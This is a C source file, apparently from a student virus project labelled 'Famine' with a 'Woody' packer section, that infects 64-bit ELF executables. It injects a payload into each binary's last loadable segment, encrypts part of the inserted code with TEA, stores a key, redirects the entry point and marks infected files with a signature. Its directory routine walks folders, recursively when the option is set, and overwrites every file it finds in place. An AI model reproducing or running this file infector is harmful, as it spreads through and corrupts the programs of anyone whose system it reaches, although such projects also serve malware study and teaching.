#include "elf64.h"
#include <elf.h>
#include "infect.h"
#include <stdio.h>

//char KEY[16];
#define DATA 0x02

//======================= WOODY ==============================

void encrypt_block(uint32_t* v, uint32_t *k) {
	uint32_t v0=v[0], v1=v[1], sum=0, i;           /* initialisation */
	uint32_t delta=0x9e3779b9;                     /* constantes de clef */
	uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* mise en cache de la clef */
	for (i=0; i < 32; i++) {                       /* boucle principale */
		sum += delta;
		v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
		v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
	}
	v[0] = v0;
	v[1]=v1;
}

void encrypt(char *s, uint64_t n, uint32_t *k){
	for (uint64_t i = 0; i < n; i += 8){
		if (i + 8 < n){
			encrypt_block((uint32_t*)(s+i), k);
		}
	}
}

//=============================================================

static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
	char *ns;
	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
	//	return FALSE;
	ns = (void*)CALL(SYS_mmap, NULL, (*n1) + n2, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return FALSE;
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
	for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
	for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
	*s1 = ns;
	*n1 = (*n1) + n2;
	return TRUE;
}

static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
	//char *ns = (char *)malloc((*n) + add);
	char *ns = (void*)CALL(SYS_mmap, NULL, (*n) + add, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return ; // TODO
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
	for (j = 0; j < add; j += 1){ns[i+j] = 0; }
	for (l = 0; i+l < *n; l += 1){ ns[i+j+l] = (*s)[i+l]; }
	//ffree(*s, *n);
	*s = ns;
	*n = (*n) + add;
}

void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt){
	//add a few information about himself
	Elf64_Ehdr *bh = (void*)b;
	size_t pos = 0/*elf_offset_entry(b, n)*/;
	//modifying 2bit after
	size_t *p = ((size_t *)(char*)(b + pos + DATA));
	p[0] = max(old_entry,entry) - min(old_entry,entry);
	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
	*p_opt = opt;
	//p[1] = entry - pos;
	//printf("diff: %zx, size: %zx\n", entry - pos, n);
	//p[2] = n;
	//size_t ok = max(text_addr,entry) - min(text_addr,entry);
	//p[3]=ok;
	//p[4] = text_length;
	//inserting KEY
	p[3] = ((size_t*)key)[0];
	p[4] = ((size_t*)key)[1];
	*(unsigned char*)(p + 3) ^= 0b01110010;
	encrypt((char*)(p+5), 15, (uint32_t*)key);
}

static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	Elf64_Ehdr *h = (void*)*s;
	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;

	size_t old_entry = h->e_entry;
	int x = elf_last_load_segment(*s, *n);
	if (ph[x].p_memsz < ph[x].p_filesz) return fail("corrupted binary");
	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
	size_t oldn = 0;
	char *olds = NULL;
	if (diff > 0){
		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
		oldn = *n;
		olds = *s;
		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
		elf_shift_offset(*s, *n, ph[x].p_offset+ph[x].p_filesz, diff);
		//reset it
		Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
		//change memsize to filesize
		ph[x].p_filesz += diff;
		ph[x].p_memsz = ph[x].p_filesz;
	}
	size_t pos = ph[x].p_offset + ph[x].p_filesz;
	size_t oldn2 = *n;
	char *olds2 = *s;
	_insert(s, n, pos, b, bn);
	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)key);
	//reset it
	elf_shift_offset(*s, *n, pos, bn);
	elf_update_flags_of_load_segments(*s, *n);
	elf_change_size_last_load_segment(*s, *n, bn);
	elf_set_off_entry(*s, *n, pos + 1);
	h = (void*)*s;
	update((*s) + pos + 1, bn, old_entry, h->e_entry, opt);
	ffree(olds2, oldn2);
	if (olds)
		ffree(olds, oldn);
	return TRUE;
}

//=============================================================

int check_already_packed(char *s, size_t n){
	char *sig = "Famine version 1.0 (c)oded by ndombre-agadhgad";
	size_t len = slen(sig)-1;
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	//check if size is enoug
	if (entry + DATA + 7*sizeof(size_t) + len >= n)
		return fail("invalid entry point");
	size_t *p = ((size_t *)(char*)(s + entry + DATA));
	if (sncmp((char*)(p+7), sig, slen(sig)) == 0)
		return fail("already packed");
	return TRUE;
}

char *debug_name(char *fname){
	char *s = ft_malloc(slen(fname)+5);
	int x;
	for (x = 0; fname[x]; x++)
		s[x] = fname[x];
	s[x] = '.';
	s[x+1] = 'l';
	s[x+2] = 'o';
	s[x+3] = 'l';
	s[x+4] = '\0';
	return s;
}

int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	char *s;
	size_t n;
	int ret = TRUE;

	if (!fget(fname, &s, &n))
	{
		fail("failed to open the file");
		goto fail;
	}
	if (elf_check_valid(s, n) == FALSE) goto fail;
	if (!check_already_packed(s, n)) goto fail;

	//after insert, update data
	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
		goto fail;
	if (!fput(outname, s, n))
	{
		fail("failed to save to woody");
		goto fail;
	}

end:
	ffree(s, n);
	return ret;
fail:
	ret = FALSE;
	goto end;
}

#define LIM 1024

int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	//print("infecting directory:");
	//println(dirname);
	struct linux_dirent *d;
	char		p[4096];
	char		tmp[LIM];
	int		fd;

	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
	while (1)
	{
		int size = getdents(fd, p, sizeof(p));
		if (size == 0)
			break;
		if (size < 0)
		{
			ft_close(fd);
			return fail("read dir");
		}
		size_t x = 0;
		while (x < size){
			d = (struct linux_dirent*)(p + x);
			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
				add_base((char *)tmp, dirname, d->d_name, LIM);
				infect_dir((char*)tmp, b,bn,crypt_off,crypt_len,opt);
			}
			else if (d_isfile(d)){
				add_base((char *)tmp, dirname, d->d_name, LIM);
				infect(tmp, /*debug_name*/(tmp), b, bn, crypt_off, crypt_len, opt);
			}
			x += d->d_reclen;
		}
	}
	ft_close(fd);
}

